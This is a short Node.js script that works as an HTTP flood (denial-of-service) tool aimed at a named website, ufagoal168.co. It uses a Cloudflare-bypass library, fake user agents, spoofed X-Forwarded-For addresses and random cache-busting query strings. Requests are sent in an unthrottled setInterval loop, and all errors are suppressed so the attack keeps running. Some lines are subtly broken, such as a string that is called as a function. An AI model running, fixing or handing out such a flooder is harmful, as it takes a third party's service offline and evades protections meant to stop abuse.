const randomstring = require("randomstring");
const cloudflare = require("cloudflare-bypasser")
const cf = new cloudflare();
const fakeUa = require("fake-useragent");
var char = randomstring.generate({
length:10,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
var charr = randomstring.generate({
length:10,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
ipq = function ranip(){
return Math.round(Math.random()*256)
}
var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
function flood_req(){
var Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
cf.request({
method:Array_method,
resolveWithFullResponse: true,
headers:{
'User-Agent': fakeUa(),
'Upgrade-Insecure-Requests': '1',
'Origin': 'http://' + char + '.com',
'Referrer': 'http://google.com/' + char,
'X-Forwarded-For': ip()
},
url:"https://ufagoal168.co/"+"?"+charr
})

}
setInterval(()=>{flood_req()})
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
